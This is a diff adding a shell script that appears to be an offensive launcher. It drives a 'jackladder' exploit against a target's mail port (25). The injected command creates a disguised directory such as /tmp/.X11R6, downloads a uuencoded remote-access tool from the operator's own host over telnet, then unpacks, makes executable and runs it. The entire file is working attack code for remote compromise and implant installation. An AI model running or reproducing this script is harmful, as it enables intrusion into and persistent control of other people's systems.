@@ -1,0 +1,38 @@
+#!/bin/sh
+case "${#}" in
+    0|1|2|3|4|6|7)
+    echo "Usage: ${0} <rem_ip> <loc_ip> <targetdir> <localport> <rat_file>"
+    echo " jl is assumed to be in ./jl"
+    echo " e.g. ${0} alice $LOCALIP /tmp/.X11R6 32177 nscd"
+    exit
+    ;;
+esac
+
+REMOTEIP=$1
+LOCALIP=$2
+TARGETDIR=$3
+LOCALPORT=$4
+RAT_FILE=$5
+
+#1 on line below is for F version. Use 2 for D version
+REALCMD="N=/dev/null
+D=$TARGETDIR
+PATH=\$D:/bin:/usr/bin:/sbin:/usr/sbin:/usr/bsd
+mkdir \$D
+cd \$D
+telnet $LOCALIP $LOCALPORT | cat > $RAT_FILE.uu
+uudecode $RAT_FILE.uu
+if [ ! -f $RAT_FILE.Z ]; then
+  telnet $LOCALIP 80
+fi
+uncompress -f $RAT_FILE.Z 
+chmod 777 $RAT_FILE 
+PATH=\$D $RAT_FILE 
+exit 0"
+
+#now run jackladder
+#mail
+REMOTEPORT=25
+
+export REALCMD
+./jl.command telnet $REMOTEIP $REMOTEPORT
